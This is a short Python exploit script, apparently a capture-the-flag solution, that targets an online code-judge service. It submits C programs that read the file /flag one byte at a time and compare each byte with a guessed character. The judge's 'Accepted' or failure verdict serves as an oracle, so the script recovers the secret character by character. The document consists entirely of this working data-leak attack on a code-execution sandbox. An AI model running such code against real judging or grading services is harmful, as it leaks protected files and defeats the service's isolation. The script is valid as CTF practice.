import requests


session = requests.Session()
url = "http://localhost:12345/jobs"


flag = ""

payload = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    FILE *file = fopen("/flag", "rb");
    int position = %POSITION%;
    fseek(file, (long)position, SEEK_SET);
    
    char character;
    fread(&character, 1, 1, file);
    
    if (character == '%GUESS%') {
        printf("Hello World!");
        fclose(file);
        return 0;
    } else {
        fclose(file);
        fprintf(stderr, "Hack for fun");
        return 1;
    }
}
"""


for pos in range(42):
    for guess in '0123456789abcdefgl-{}':
        data = {
            "language": "C",
            "problem_id": 0,
            "source_code": payload.replace("%POSITION%", str(pos)).replace("%GUESS%", guess),
        }
        resp = session.post(url=url, json=data)
        resp_json = resp.json()

        if resp_json["result"] == "Accepted":
            flag += guess
            print(flag)
            break
